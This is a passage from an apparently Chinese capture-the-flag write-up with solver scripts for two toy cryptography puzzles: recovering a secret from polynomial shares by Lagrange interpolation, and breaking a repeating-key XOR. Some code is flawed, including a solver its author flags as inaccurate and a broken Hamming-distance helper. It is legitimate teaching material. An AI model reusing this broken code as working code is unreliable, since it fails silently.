</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>flag</span><span class=o>.</span><span class=n>decode</span><span class=p>())</span>
</span></span></code></pre></div><h4 id=prof-shamirs-secret>Prof. Shamir&rsquo;s Secret</h4><p>lab.py：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>secret</span> <span class=kn>import</span> <span class=n>flag</span>
</span></span><span class=line><span class=cl><span class=n>a</span> <span class=o>=</span> <span class=n>getPrime</span><span class=p>(</span><span class=mi>256</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>b</span> <span class=o>=</span> <span class=n>getPrime</span><span class=p>(</span><span class=mi>256</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>c</span> <span class=o>=</span> <span class=n>getPrime</span><span class=p>(</span><span class=mi>256</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>d</span> <span class=o>=</span> <span class=n>bytes_to_long</span><span class=p>(</span><span class=n>flag</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>n</span> <span class=o>=</span> <span class=n>getStrongPrime</span><span class=p>(</span><span class=mi>2048</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>poly</span><span class=p>(</span><span class=n>x</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=p>(</span><span class=n>a</span> <span class=o>*</span> <span class=n>x</span> <span class=o>**</span> <span class=mi>3</span> <span class=o>+</span> <span class=n>b</span> <span class=o>*</span> <span class=n>x</span> <span class=o>**</span> <span class=mi>2</span> <span class=o>+</span> <span class=n>c</span> <span class=o>*</span> <span class=n>x</span> <span class=o>+</span> <span class=n>d</span><span class=p>)</span> <span class=o>%</span> <span class=n>n</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>4</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>x</span> <span class=o>=</span> <span class=n>getRandomNBitInteger</span><span class=p>(</span><span class=mi>256</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s1>&#39;(</span><span class=si>{</span><span class=n>x</span><span class=si>}</span><span class=s1>, </span><span class=si>{</span><span class=n>poly</span><span class=p>(</span><span class=n>x</span><span class=p>)</span><span class=si>}</span><span class=s1>)&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>n</span><span class=p>)</span>
</span></span></code></pre></div><p>output.txt：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=p>(</span><span class=mi>107156592202708719207677242145785380370925248573491581679548864240229105117413</span><span class=p>,</span> <span class=mi>130345771647598884054430192964980389494531690916321281560051538057910945565624075918097771618618910263287152864051564635195578796179646674192491555857366963976329072793625649841007238934532144994966695961491116944111900519450656607199501654544809304677384301432194356761274376314501143216649135187625964931902</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=mi>90629424458637844580841178302065768114471702341586161908858665404968070428143</span><span class=p>,</span> <span class=mi>78858394764644720845979385422903377630845158220853604360871859882044655577246282808874532941560824773914594412415345616068416548364923695233972936176087206729847544516343237888024173952758718279163069742944961359652574962129434781851767007643037433981750489254639449637677610354746497770492254725894119193662</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=mi>100626477579781167218124067468465940736522526684796828200460725563611057086831</span><span class=p>,</span> <span class=mi>107938673826832098883774065383352754899611421173786919174851524067358319831595518533880365335333592351382030254987030861475878447430100862628809476494215295084769705787398168068863060859122952000010558086859754975554734850230223040925027217057055876423229204027280075168615462165634569977166298865366648414270</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>(</span><span class=mi>93935717805931479760310332373603550626215862380271563609987050092246456803681</span><span class=p>,</span> <span class=mi>87807687834883656794449107852803757931909462710953942209358337840912886376275257864214018767300085688088981183791568376874906785193974861264511995029891797395218085734556515485224508250678274640400740193260888803386269425525930551167801371074041851406813322268615707951973495879968706624649318162995708734670</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=mi>31332583438236375592937719796184754941510418106758544436807128579095975774977164550965999210436423180868482749439792419270701760326867558983833590368116755394302102816558834270767750410927007254951332459412016857259923960095221831744199277859298274645778838122123090174549834537459028702418645316659860963695912411044490603690484176741018002722235584411422885336520840416125528921196994346534698226763483608314982898155320734426983215291745003213365884087604024203316024824786079501166114638727651689476288442288919373885358425210859822108037791909364199015379638899887715692181883916583183449343868694265742569597579</span>
</span></span></code></pre></div><p>拉格朗日插值</p><p>exp.py</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>Crypto.Util.number</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>x</span> <span class=o>=</span> <span class=p>[</span><span class=mi>107156592202708719207677242145785380370925248573491581679548864240229105117413</span><span class=p>,</span><span class=mi>90629424458637844580841178302065768114471702341586161908858665404968070428143</span><span class=p>,</span><span class=mi>100626477579781167218124067468465940736522526684796828200460725563611057086831</span><span class=p>,</span><span class=mi>93935717805931479760310332373603550626215862380271563609987050092246456803681</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>fx</span> <span class=o>=</span> <span class=p>[</span><span class=mi>130345771647598884054430192964980389494531690916321281560051538057910945565624075918097771618618910263287152864051564635195578796179646674192491555857366963976329072793625649841007238934532144994966695961491116944111900519450656607199501654544809304677384301432194356761274376314501143216649135187625964931902</span><span class=p>,</span><span class=mi>78858394764644720845979385422903377630845158220853604360871859882044655577246282808874532941560824773914594412415345616068416548364923695233972936176087206729847544516343237888024173952758718279163069742944961359652574962129434781851767007643037433981750489254639449637677610354746497770492254725894119193662</span><span class=p>,</span><span class=mi>107938673826832098883774065383352754899611421173786919174851524067358319831595518533880365335333592351382030254987030861475878447430100862628809476494215295084769705787398168068863060859122952000010558086859754975554734850230223040925027217057055876423229204027280075168615462165634569977166298865366648414270</span><span class=p>,</span><span class=mi>87807687834883656794449107852803757931909462710953942209358337840912886376275257864214018767300085688088981183791568376874906785193974861264511995029891797395218085734556515485224508250678274640400740193260888803386269425525930551167801371074041851406813322268615707951973495879968706624649318162995708734670</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span> <span class=mi>31332583438236375592937719796184754941510418106758544436807128579095975774977164550965999210436423180868482749439792419270701760326867558983833590368116755394302102816558834270767750410927007254951332459412016857259923960095221831744199277859298274645778838122123090174549834537459028702418645316659860963695912411044490603690484176741018002722235584411422885336520840416125528921196994346534698226763483608314982898155320734426983215291745003213365884087604024203316024824786079501166114638727651689476288442288919373885358425210859822108037791909364199015379638899887715692181883916583183449343868694265742569597579</span>
</span></span><span class=line><span class=cl><span class=n>u</span> <span class=o>=</span> <span class=p>[</span><span class=mi>1</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>u</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=o>-</span><span class=n>x</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>*</span><span class=n>x</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span><span class=o>*</span><span class=n>x</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span><span class=o>*</span><span class=n>fx</span><span class=p>[</span><span class=mi>0</span><span class=p>])</span><span class=o>//</span><span class=p>((</span><span class=n>x</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>-</span><span class=n>x</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span><span class=o>*</span><span class=p>(</span><span class=n>x</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>-</span><span class=n>x</span><span class=p>[</span><span class=mi>2</span><span class=p>])</span><span class=o>*</span><span class=p>(</span><span class=n>x</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>-</span><span class=n>x</span><span class=p>[</span><span class=mi>3</span><span class=p>]))</span>  
</span></span><span class=line><span class=cl><span class=n>u</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=o>-</span><span class=n>x</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>*</span><span class=n>x</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span><span class=o>*</span><span class=n>x</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span><span class=o>*</span><span class=n>fx</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span><span class=o>//</span><span class=p>((</span><span class=n>x</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>-</span><span class=n>x</span><span class=p>[</span><span class=mi>0</span><span class=p>])</span><span class=o>*</span><span class=p>(</span><span class=n>x</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>-</span><span class=n>x</span><span class=p>[</span><span class=mi>2</span><span class=p>])</span><span class=o>*</span><span class=p>(</span><span class=n>x</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>-</span><span class=n>x</span><span class=p>[</span><span class=mi>3</span><span class=p>]))</span>
</span></span><span class=line><span class=cl><span class=n>u</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=o>-</span><span class=n>x</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>*</span><span class=n>x</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>*</span><span class=n>x</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span><span class=o>*</span><span class=n>fx</span><span class=p>[</span><span class=mi>2</span><span class=p>])</span><span class=o>//</span><span class=p>((</span><span class=n>x</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span><span class=o>-</span><span class=n>x</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span><span class=o>*</span><span class=p>(</span><span class=n>x</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span><span class=o>-</span><span class=n>x</span><span class=p>[</span><span class=mi>0</span><span class=p>])</span><span class=o>*</span><span class=p>(</span><span class=n>x</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span><span class=o>-</span><span class=n>x</span><span class=p>[</span><span class=mi>3</span><span class=p>]))</span>
</span></span><span class=line><span class=cl><span class=n>u</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span> <span class=o>=</span> <span class=p>(</span><span class=o>-</span><span class=n>x</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>*</span><span class=n>x</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span><span class=o>*</span><span class=n>x</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>*</span><span class=n>fx</span><span class=p>[</span><span class=mi>3</span><span class=p>])</span><span class=o>//</span><span class=p>((</span><span class=n>x</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span><span class=o>-</span><span class=n>x</span><span class=p>[</span><span class=mi>1</span><span class=p>])</span><span class=o>*</span><span class=p>(</span><span class=n>x</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span><span class=o>-</span><span class=n>x</span><span class=p>[</span><span class=mi>2</span><span class=p>])</span><span class=o>*</span><span class=p>(</span><span class=n>x</span><span class=p>[</span><span class=mi>3</span><span class=p>]</span><span class=o>-</span><span class=n>x</span><span class=p>[</span><span class=mi>0</span><span class=p>]))</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>u</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>s</span> <span class=o>=</span> <span class=nb>pow</span><span class=p>(</span><span class=n>u</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span><span class=o>+</span><span class=n>u</span><span class=p>[</span><span class=mi>1</span><span class=p>]</span><span class=o>+</span><span class=n>u</span><span class=p>[</span><span class=mi>2</span><span class=p>]</span><span class=o>+</span><span class=n>u</span><span class=p>[</span><span class=mi>3</span><span class=p>],</span><span class=mi>1</span><span class=p>,</span><span class=n>p</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>long_to_bytes</span><span class=p>(</span><span class=n>s</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>,</span><span class=s1>&#39;ignore&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># 除法误差大</span>
</span></span></code></pre></div><p>exp.sage</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>Point</span> <span class=o>=</span>
</span></span><span class=line><span class=cl><span class=p>[(</span><span class=mi>107156592202708719207677242145785380370925248573491581679548864240229105117413</span><span class=p>,</span><span class=mi>130345771647598884054430192964980389494531690916321281560051538057910945565624075918097771618618910263287152864051564635195578796179646674192491555857366963976329072793625649841007238934532144994966695961491116944111900519450656607199501654544809304677384301432194356761274376314501143216649135187625964931902</span><span class=p>),(</span><span class=mi>90629424458637844580841178302065768114471702341586161908858665404968070428143</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=mi>78858394764644720845979385422903377630845158220853604360871859882044655577246282808874532941560824773914594412415345616068416548364923695233972936176087206729847544516343237888024173952758718279163069742944961359652574962129434781851767007643037433981750489254639449637677610354746497770492254725894119193662</span><span class=p>),(</span><span class=mi>100626477579781167218124067468465940736522526684796828200460725563611057086831</span><span class=p>,</span><span class=mi>107938673826832098883774065383352754899611421173786919174851524067358319831595518533880365335333592351382030254987030861475878447430100862628809476494215295084769705787398168068863060859122952000010558086859754975554734850230223040925027217057055876423229204027280075168615462165634569977166298865366648414270</span><span class=p>),(</span><span class=mi>93935717805931479760310332373603550626215862380271563609987050092246456803681</span><span class=p>,</span>
</span></span><span class=line><span class=cl><span class=mi>87807687834883656794449107852803757931909462710953942209358337840912886376275257864214018767300085688088981183791568376874906785193974861264511995029891797395218085734556515485224508250678274640400740193260888803386269425525930551167801371074041851406813322268615707951973495879968706624649318162995708734670</span><span class=p>)]</span>
</span></span><span class=line><span class=cl><span class=n>p</span> <span class=o>=</span><span class=mi>31332583438236375592937719796184754941510418106758544436807128579095975774977164550965999210436423180868482749439792419270701760326867558983833590368116755394302102816558834270767750410927007254951332459412016857259923960095221831744199277859298274645778838122123090174549834537459028702418645316659860963695912411044490603690484176741018002722235584411422885336520840416125528921196994346534698226763483608314982898155320734426983215291745003213365884087604024203316024824786079501166114638727651689476288442288919373885358425210859822108037791909364199015379638899887715692181883916583183449343868694265742569597579</span>
</span></span><span class=line><span class=cl><span class=n>R</span><span class=o>.&lt;</span><span class=n>x</span><span class=o>&gt;</span> <span class=o>=</span> <span class=n>PolynomialRing</span><span class=p>(</span><span class=n>GF</span><span class=p>(</span><span class=n>p</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>f</span> <span class=o>=</span> <span class=n>R</span><span class=o>.</span><span class=n>lagrange_polynomial</span><span class=p>(</span><span class=n>Point</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>flag</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>f</span><span class=p>(</span><span class=mi>0</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=n>flag</span><span class=p>)[</span><span class=mi>2</span><span class=p>:]))</span>
</span></span></code></pre></div><h4 id=otp>OTP</h4><p>onetimepad：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=n>xor</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>string</span> <span class=kn>import</span> <span class=n>ascii_lowercase</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>secret</span> <span class=kn>import</span> <span class=n>keylength</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>random</span>
</span></span><span class=line><span class=cl><span class=n>key</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=n>keylength</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>key</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>random</span><span class=o>.</span><span class=n>choice</span><span class=p>(</span><span class=n>ascii_lowercase</span><span class=o>.</span><span class=n>encode</span><span class=p>()))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>key</span> <span class=o>=</span> <span class=nb>bytes</span><span class=p>(</span><span class=n>key</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>plaintext</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;books.txt&#39;</span><span class=p>,</span><span class=s1>&#39;rb&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>ciphertext</span> <span class=o>=</span> <span class=n>xor</span><span class=p>(</span><span class=n>plaintext</span><span class=p>,</span> <span class=n>key</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>key</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>open</span><span class=p>(</span><span class=s1>&#39;encrypted_book&#39;</span><span class=p>,</span> <span class=s1>&#39;wb&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>ciphertext</span><span class=p>)</span>
</span></span></code></pre></div><p>gift_from_sias27.py：</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># ------------------------------------------------------</span>
</span></span><span class=line><span class=cl><span class=c1># 查完相关资料后再使用本文件</span>
</span></span><span class=line><span class=cl><span class=c1># 查完相关资料后再使用本文件</span>
</span></span><span class=line><span class=cl><span class=c1># 查完相关资料后再使用本文件</span>
</span></span><span class=line><span class=cl><span class=c1># 查完相关资料后再使用本文件</span>
</span></span><span class=line><span class=cl><span class=c1># 查完相关资料后再使用本文件</span>
</span></span><span class=line><span class=cl><span class=c1># 查完相关资料后再使用本文件</span>
</span></span><span class=line><span class=cl><span class=c1># 查完相关资料后再使用本文件</span>
</span></span><span class=line><span class=cl><span class=c1># 查完相关资料后再使用本文件</span>
</span></span><span class=line><span class=cl><span class=c1># 查完相关资料后再使用本文件</span>
</span></span><span class=line><span class=cl><span class=c1># 查完相关资料后再使用本文件</span>
</span></span><span class=line><span class=cl><span class=c1># 查完相关资料后再使用本文件</span>
</span></span><span class=line><span class=cl><span class=c1># 查完相关资料后再使用本文件</span>
</span></span><span class=line><span class=cl><span class=c1># 查完相关资料后再使用本文件</span>
</span></span><span class=line><span class=cl><span class=c1># 查完相关资料后再使用本文件</span>
</span></span><span class=line><span class=cl><span class=c1># ------------------------------------------------------</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>itertools</span> <span class=kn>import</span> <span class=n>product</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>libnum</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=c1># ------------------------------------------------------</span>
</span></span><span class=line><span class=cl><span class=c1># 查完相关资料后再使用本文件</span>
</span></span><span class=line><span class=cl><span class=c1># 查完相关资料后再使用本文件</span>
</span></span><span class=line><span class=cl><span class=c1># 查完相关资料后再使用本文件</span>
</span></span><span class=line><span class=cl><span class=c1># 查完相关资料后再使用本文件</span>
</span></span><span class=line><span class=cl><span class=c1># 查完相关资料后再使用本文件</span>
</span></span><span class=line><span class=cl><span class=c1># 查完相关资料后再使用本文件</span>
</span></span><span class=line><span class=cl><span class=c1># 查完相关资料后再使用本文件</span>
</span></span><span class=line><span class=cl><span class=c1># 查完相关资料后再使用本文件</span>
</span></span><span class=line><span class=cl><span class=c1># 查完相关资料后再使用本文件</span>
</span></span><span class=line><span class=cl><span class=c1># 查完相关资料后再使用本文件</span>
</span></span><span class=line><span class=cl><span class=c1># 查完相关资料后再使用本文件</span>
</span></span><span class=line><span class=cl><span class=c1># 查完相关资料后再使用本文件</span>
</span></span><span class=line><span class=cl><span class=c1># 查完相关资料后再使用本文件</span>
</span></span><span class=line><span class=cl><span class=c1># 查完相关资料后再使用本文件</span>
</span></span><span class=line><span class=cl><span class=c1># ------------------------------------------------------</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>hamming_distance</span><span class=p>(</span><span class=n>a</span><span class=p>,</span> <span class=n>b</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>a</span><span class=p>)</span> <span class=o>!=</span> <span class=nb>len</span><span class=p>(</span><span class=n>b</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=o>-</span><span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=n>bit_1_a</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=n>bit_2_a</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>a</span><span class=p>)):</span>
</span></span><span class=line><span class=cl>        <span class=n>bit_1_a</span> <span class=o>+=</span> <span class=nb>bin</span><span class=p>(</span><span class=n>a</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=mi>2</span><span class=p>:])</span>
</span></span><span class=line><span class=cl>        <span class=n>bit_2_a</span> <span class=o>+=</span> <span class=nb>bin</span><span class=p>(</span><span class=n>b</span><span class=p>[</span><span class=n>i</span><span class=p>][</span><span class=mi>2</span><span class=p>:])</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>abs</span><span class=p>(</span><span class=n>bit_1_a</span> <span class=o>-</span> <span class=n>bit_2_a</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># ------------------------------------------------------</span>
</span></span><span class=line><span class=cl><span class=c1># 查完相关资料后再使用本文件</span>
</span></span><span class=line><span class=cl><span class=c1># 查完相关资料后再使用本文件</span>
</span></span><span class=line><span class=cl><span class=c1># 查完相关资料后再使用本文件</span>
</span></span><span class=line><span class=cl><span class=c1># 查完相关资料后再使用本文件</span>
</span></span><span class=line><span class=cl><span class=c1># 查完相关资料后再使用本文件</span>
</span></span><span class=line><span class=cl><span class=c1># 查完相关资料后再使用本文件</span>
</span></span><span class=line><span class=cl><span class=c1># 查完相关资料后再使用本文件</span>
</span></span><span class=line><span class=cl><span class=c1># 查完相关资料后再使用本文件</span>
</span></span><span class=line><span class=cl><span class=c1># 查完相关资料后再使用本文件</span>
</span></span><span class=line><span class=cl><span class=c1># 查完相关资料后再使用本文件</span>
</span></span><span class=line><span class=cl><span class=c1># 查完相关资料后再使用本文件</span>
</span></span><span class=line><span class=cl><span class=c1># 查完相关资料后再使用本文件</span>
</span></span><span class=line><span class=cl><span class=c1># 查完相关资料后再使用本文件</span>
</span></span><span class=line><span class=cl><span class=c1># 查完相关资料后再使用本文件</span>
</span></span><span class=line><span class=cl><span class=c1># ------------------------------------------------------</span>
</span></span><span class=line><span class=cl><span class=n>y</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>kasiski_test</span><span class=p>(</span><span class=n>ciphretext</span><span class=p>:</span><span class=nb>bytes</span><span class=p>,</span> <span class=n>length</span><span class=o>=</span><span class=mi>3</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>global</span> <span class=n>y</span>
</span></span><span class=line><span class=cl>    <span class=c1># if y == 0:</span>
</span></span><span class=line><span class=cl>    <span class=c1>#     print(&#39;你查完资料了吗?&#39;)</span>
</span></span><span class=line><span class=cl>    <span class=c1>#     y = input(&#39;(Y/N) &gt; &#39;)</span>
</span></span><span class=line><span class=cl>    <span class=c1>#     if &#39;N&#39; in y or &#39;n&#39; in y:</span>
</span></span><span class=line><span class=cl>    <span class=c1>#         exit()</span>
</span></span><span class=line><span class=cl>    <span class=n>dup_sturct</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>ciphretext</span><span class=p>)</span> <span class=o>-</span> <span class=mi>3</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>sub_struct</span> <span class=o>=</span> <span class=n>ciphretext</span><span class=p>[</span><span class=n>i</span><span class=p>:</span><span class=n>i</span><span class=o>+</span><span class=n>length</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>ciphretext</span><span class=o>.</span><span class=n>count</span><span class=p>(</span><span class=n>sub_struct</span><span class=p>)</span> <span class=o>&gt;=</span> <span class=mi>2</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>dup_sturct</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>sub_struct</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>possible_range</span> <span class=o>=</span> <span class=nb>set</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>d</span> <span class=ow>in</span> <span class=n>dup_sturct</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>start</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>        <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>        <span class=k>while</span> <span class=n>i</span><span class=o>+</span><span class=n>length</span> <span class=o>&lt;</span> <span class=nb>len</span><span class=p>(</span><span class=n>ciphretext</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>d</span> <span class=o>==</span> <span class=n>ciphretext</span><span class=p>[</span><span class=n>i</span><span class=p>:</span><span class=n>i</span><span class=o>+</span><span class=n>length</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>                <span class=n>start</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>i</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=n>i</span> <span class=o>+=</span> <span class=mi>1</span>
</span></span><span class=line><span class=cl>        <span class=n>diff</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>start</span><span class=p>)</span> <span class=o>-</span> <span class=mi>1</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=n>diff</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>start</span><span class=p>[</span><span class=n>i</span><span class=o>+</span><span class=mi>1</span><span class=p>]</span> <span class=o>-</span> <span class=n>start</span><span class=p>[</span><span class=n>i</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=n>possible_range</span><span class=o>.</span><span class=n>add</span><span class=p>(</span><span class=n>gcd</span><span class=p>(</span><span class=o>*</span><span class=n>diff</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>gcd_list</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>product</span><span class=p>(</span><span class=n>possible_range</span><span class=p>,</span> <span class=n>repeat</span><span class=o>=</span><span class=mi>2</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>gcd_list</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>gcd</span><span class=p>(</span><span class=n>i</span><span class=p>[</span><span class=mi>0</span><span class=p>],</span><span class=n>i</span><span class=p>[</span><span class=mi>1</span><span class=p>]))</span>
</span></span><span class=line><span class=cl>    <span class=n>gcd_elem</span> <span class=o>=</span> <span class=nb>set</span><span class=p>(</span><span class=n>gcd_list</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>pre_sort</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=n>width</span> <span class=o>=</span> <span class=mi>0</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>gcd_elem</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>pre_sort</span><span class=o>.</span><span class=n>append</span><span class=p>((</span><span class=n>i</span><span class=p>,</span> <span class=n>gcd_list</span><span class=o>.</span><span class=n>count</span><span class=p>(</span><span class=n>i</span><span class=p>)</span> <span class=o>/</span> <span class=nb>len</span><span class=p>(</span><span class=n>gcd_list</span><span class=p>)))</span>
